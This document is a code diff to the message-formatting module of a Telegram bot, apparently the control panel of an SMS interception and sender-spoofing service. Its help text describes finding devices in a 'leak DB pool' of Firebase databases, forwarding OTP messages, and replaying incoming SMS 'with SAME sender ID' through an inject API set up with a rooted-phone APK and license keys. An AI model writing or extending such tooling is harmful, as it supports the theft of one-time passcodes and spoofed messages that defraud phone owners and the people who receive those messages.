@@ -21,7 +21,7 @@ def format_apk_download_card(download_url: str) -> str:
         "<pre>"
         "Android (rooted mynum phone):\n"
         "1. APK install\n"
-        "2. Bot wala KEY daalo (Firebase auto-pull)\n"
+        "2. APK me KEY|Firebase URL daalo (pipe format)\n"
         "3. START SERVICE ON\n"
         "4. TEST INJECTION\n"
         "5. Bot /startmonitor"
@@ -126,7 +126,7 @@ def get_sim_list(device: Device) -> list[dict]:
     if isinstance(sims, list) and sims:
         cleaned = [sim for sim in sims if isinstance(sim, dict)]
         if cleaned:
-            return _normalize_sim_slots(cleaned)
+            return _ensure_dual_sim_list(_normalize_sim_slots(cleaned))
 
     primary = device.phone_number
     sim2 = meta.get("sim2") or meta.get("phone2")
@@ -143,17 +143,33 @@ def get_sim_list(device: Device) -> list[dict]:
             }
         )
     if built:
-        return built
-    return [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary or "Unknown"}]
+        return _ensure_dual_sim_list(built)
+    return _ensure_dual_sim_list(
+        [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary or "Unknown"}]
+    )
+
+
+def _ensure_dual_sim_list(sims: list[dict]) -> list[dict]:
+    """Always show SIM 1 + SIM 2 in cards and buttons (Astik layout)."""
+    if not sims:
+        return [
+            {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "N/A"},
+            {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
+        ]
+    ordered = sorted(sims, key=lambda sim: sim.get("slot", sim.get("index", 0) + 1))
+    first = {**ordered[0], "slot": 1, "index": 0}
+    if len(ordered) >= 2:
+        second = {**ordered[1], "slot": 2, "index": 1}
+        return [first, second]
+    return [
+        first,
+        {"slot": 2, "index": 1, "carrier": "SIM 2", "number": "N/A"},
+    ]
 
 
 def get_display_sims(device: Device) -> list[dict]:
-    """UI buttons — show both SIM slots when device reports dual SIM."""
-    sims = get_sim_list(device)
-    if len(sims) >= 2:
-        return sims[:2]
-    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
-    return active if active else sims[:1]
+    """UI — always SIM 1 and SIM 2."""
+    return get_sim_list(device)[:2]
 
 
 def get_active_sims(device: Device) -> list[dict]:
@@ -254,27 +270,59 @@ def _format_sim_number(number: str) -> str:
     return f"+{text}" if text.isdigit() else text
 
 
+def _sim_has_rich_label(sim: dict) -> bool:
+    """Show number/carrier on SIM buttons when we know the slot number."""
+    return _is_valid_sim_number(sim.get("number"))
+
+
+def _sim_list_line(sim: dict, *, found_card: bool = False) -> str:
+    """Astik SIM row — found card uses +91, setdevice uses local digits or N/A."""
+    from app.services import display_phone
+
+    slot = sim.get("slot", 1)
+    carrier = (sim.get("carrier") or f"SIM {slot}").strip()
+    number = sim.get("number")
+    if not _is_valid_sim_number(number):
+        return f"SIM {slot}: Unknown (N/A)"
+    shown = _format_sim_number(number) if found_card else display_phone(number)
+    return f"SIM {slot}: {carrier} ({shown})"
+
+
+def _active_sim_line(sim: dict) -> str:
+    slot = sim.get("slot", 1)
+    index = sim.get("index", slot - 1)
+    carrier = (sim.get("carrier") or f"SIM {slot}").strip()
+    if _sim_has_rich_label(sim):
+        return f"📶 Active SIM: {carrier} (Index {index})"
+    return f"📶 Active SIM: SIM {slot} (Index {index})"
+
+
+def _from_number_line(sim: dict) -> str:
+    from app.services import display_phone
+
+    number = sim.get("number")
+    if _is_valid_sim_number(number):
+        return f"📞 FROM Number: {display_phone(number)}"
+    return "📞 FROM Number: N/A"
+
+
 def _sim_button_label(sim: dict, *, compact: bool = False) -> str:
+    from app.services import display_phone
+
     slot = sim.get("slot", 1)
     if compact:
         return f"📶 SIM {slot}"
     carrier = sim.get("carrier") or f"SIM {slot}"
-    number = _format_sim_number(sim.get("number") or "Unknown")
+    number = display_phone(sim.get("number")) if _is_valid_sim_number(sim.get("number")) else "N/A"
     label = f"📶 SIM {slot}: {carrier} ({number})"
     return label[:32] + "..." if len(label) > 35 else label
 
 
-def _sim_lines_block(device: Device, *, numbered: bool = False) -> str:
-    lines = []
-    for sim in get_display_sims(device):
-        slot = sim.get("slot", 1)
-        carrier = sim.get("carrier") or f"SIM {slot}"
-        number = sim.get("number") or "Unknown"
-        if numbered:
-            lines.append(f"SIM {slot}: {carrier} ({_format_sim_number(number)})")
-        else:
-            lines.append(f"📶 SIM {slot}: {carrier} ({number})")
-    return "\n".join(lines) if lines else "📶 SIM: Unknown"
+def _sim_lines_block(device: Device, *, found_card: bool = False) -> str:
+    sims = get_display_sims(device)
+    if not sims:
+        return "SIM 1: Unknown (N/A)"
+    return "\n".join(_sim_list_line(sim, found_card=found_card) for sim in sims)
 
 
 def format_device_found_card(
@@ -285,24 +333,25 @@ def format_device_found_card(
     monitoring_was_stopped: bool = False,
 ) -> str:
     """Astik /fdy — Device Found & Set card with DB + timing."""
-    device_short = short_device_id(device.name)
     stop_block = ""
     if monitoring_was_stopped:
         stop_block = (
             "\n⚠️ Previous monitoring was AUTO-STOPPED.\n"
             "Use /startmonitor again when ready."
         )
+    sim_block = _sim_lines_block(device, found_card=True)
     timing = f"\n⚡ Found in {found_ms}ms" if found_ms is not None else ""
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "✅ Device Found &amp; Set! &lt;/&gt;\n"
-        f"📱 {device_short}\n"
+        f"📱 {short_device_id(device.name)}\n"
         f"📞 {_device_phone_display(device)}\n"
         f"🔋 {get_battery(device)}\n"
         f"{format_device_connection_status(device)}\n"
-        f"🗃️ DB: {_db_label(device, profile)}"
+        f"🗄️ DB: {_db_label(device, profile)}"
         f"{stop_block}\n\n"
+        f"{sim_block}\n\n"
         "Select SIM to send FROM:"
         f"{timing}"
         "</pre>"
@@ -312,13 +361,14 @@ def format_device_found_card(
 def format_device_set_card(
     device: Device,
     selected_sim: int = 0,
+    profile: MonitorProfile | None = None,
     *,
     status: str = "online",
 ) -> str:
-    """Astik /setdevice — Device Set card with SIM list."""
+    """Astik /setdevice — Device Set card with live status, DB, SIM list."""
     device_short = short_device_id(device.name)
     active = get_selected_sim(device, selected_sim)
-    active_slot = active.get("slot", 1)
+    sim_block = _sim_lines_block(device, found_card=False)
 
     return (
         "✅ <b>SUCCESS</b>\n\n"
@@ -326,14 +376,20 @@ def format_device_set_card(
         "Device Set!\n\n"
         f"📱 {device_short}\n"
         f"🔋 {get_battery(device)}\n"
-        f"📶 Active SIM: SIM {active_slot}\n\n"
+        f"{format_device_connection_status(device)}\n"
+        f"🗄️ DB: {_db_label(device, profile)}\n"
+        f"{_active_sim_line(active)}\n"
+        f"{_from_number_line(active)}\n\n"
+        f"{sim_block}\n\n"
         "Select SIM Slot for sending SMS:"
         "</pre>"
     )
 
 
-def device_set_keyboard(device: Device, *, compact: bool = False) -> InlineKeyboardMarkup:
+def device_set_keyboard(device: Device, *, compact: bool | None = None) -> InlineKeyboardMarkup:
     sims = get_display_sims(device)
+    if compact is None:
+        compact = not any(_sim_has_rich_label(sim) for sim in sims)
     buttons = [
         InlineKeyboardButton(
             _sim_button_label(sim, compact=compact),
@@ -360,16 +416,21 @@ def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
     )
 
 
-def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
+def format_sim_selected_card(
+    device: Device,
+    sim_index: int = 0,
+    profile: MonitorProfile | None = None,
+) -> str:
     active = get_selected_sim(device, sim_index)
     slot = active.get("slot", 1)
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         f"📱 {short_device_id(device.name)}\n"
-        f"📡 Device: {format_device_online(device)}\n"
+        f"📡 Device: {format_device_connection_status(device)}\n"
         f"✅ SIM {slot} selected\n"
-        f"🔋 {get_battery(device)}\n\n"
+        f"🔋 {get_battery(device)}\n"
+        f"🗄️ DB: {_db_label(device, profile)}\n\n"
         "Tap START Monitoring or STOP:"
         "</pre>"
     )
@@ -423,6 +484,21 @@ def format_outbound_stream_card(
     )
 
 
+def format_firebase_otp_card(
+    sender: str,
+    message: str,
+    queued_ms: int = 3,
+    total_ms: int = 14,
+) -> str:
+    """Astik-style OTP card from Firebase (bot-only display)."""
+    return format_inject_stream_card(
+        sender,
+        message,
+        queued_ms=queued_ms,
+        total_ms=total_ms,
+    )
+
+
 def format_inject_stream_card(
     sender: str,
     message: str,
@@ -435,8 +511,8 @@ def format_inject_stream_card(
     return (
         "✅ <b>SUCCESS</b>\n"
         "<pre>"
-        "⚡ INJECT FORWARDED! [STREAM]\n"
-        f"📥 Sender: {sender}\n"
+        "⚡ INJECT FORWARDED! [STREAM] &lt;/&gt;\n"
+        f"📤 Sender: {sender}\n"
         f"🔐 {body}\n"
         f"{format_timing_footer(queued_ms, total_ms)}"
         "</pre>"
@@ -487,7 +563,6 @@ def format_monitoring_card(
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
     test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
-
     channel = profile.channel_id or "—"
     return (
         "✅ <b>SUCCESS</b>\n"
@@ -525,13 +600,13 @@ def format_commands_message() -> str:
         "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
         "1. /key KEY-XXXX-XXXX-XXXX — Your license key\n"
-        "2. /a &lt;device_id&gt; — Pick device to monitor\n"
+        "2. /fy &lt;device_id&gt; — Pick device to monitor\n"
         "3. Pick SIM → /addchannel → /startmonitor\n"
         "4. → Incoming SMS replayed with SAME sender ID via inject"
         "</pre>\n\n"
         "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
         "<pre>"
-        "1. /fdy &lt;device_id&gt; — Find device &amp; select SIM\n"
+        "1. /fb &lt;device_id&gt; — Find device &amp; select SIM\n"
         "2. /mynum &lt;number&gt; — Your forwarding number\n"
         "3. /addchannel — Add group for monitoring\n"
         "4. /startmonitor — Start auto-forwarding"
@@ -564,13 +639,13 @@ def format_welcome_message() -> str:
         "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
         "1. /key KEY-XXXX-XXXX-XXXX — Your license key (like /mynum for inject)\n"
-        "2. /a &lt;device_id&gt; — Pick device to monitor\n"
+        "2. /fy &lt;device_id&gt; — Pick device to monitor\n"
         "3. Pick SIM → /addchannel → /startmonitor\n"
         "4. → Incoming SMS replayed with SAME sender ID via inject API"
         "</pre>\n\n"
         "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
         "<pre>"
-        "1. /fdy &lt;device_id&gt; — Find device &amp; select SIM\n"
+        "1. /fb &lt;device_id&gt; — Find device &amp; select SIM\n"
         "2. /mynum &lt;number&gt; — Your forwarding number\n"
         "3. /addchannel — Add group for monitoring\n"
         "4. /startmonitor — Start auto-forwarding"
@@ -585,7 +660,7 @@ def format_welcome_message() -> str:
         "</pre>\n\n"
         "✨ 🎮 <b>Controls</b>\n"
         "<pre>"
-        "/stop /resume /status /send /ping /help /guide /apk"
+        "/stop /resume /status /send /ping"
         "</pre>"
     )
 
@@ -638,6 +713,16 @@ def format_ping_card(latency_ms: int) -> str:
     )
 
 
+def format_device_not_found_card(device_id: str, db_count: int) -> str:
+    """Astik-style — device missing from entire leak DB pool."""
+    return (
+        "❌ <b>ERROR</b>\n\n"
+        "<pre>"
+        f"Device {device_id} not found in any of the {db_count} databases!"
+        "</pre>"
+    )
+
+
 def format_key_error_card() -> str:
     return (
         "❌ <b>ERROR</b>\n\n"
@@ -662,8 +747,9 @@ def format_key_set_card(inject_key: str) -> str:
         "<pre>"
         "License Key Set!\n\n"
         f"🔑 {inject_key}\n\n"
-        "Next: '/a &lt;device_id&gt;' → pick SIM → '/addchannel' → '/startmonitor'\n"
-        "Incoming SMS will inject with SAME sender ID."
+        "Next: '/a &lt;device_id&gt;' → SIM → '/mynum &lt;apk-phone&gt;' → '/startmonitor'\n"
+        "APK: same KEY only → START ON → TEST INJECTION\n"
+        "Incoming SMS inject with SAME sender ID on /mynum phone."
         "</pre>"
     )
 
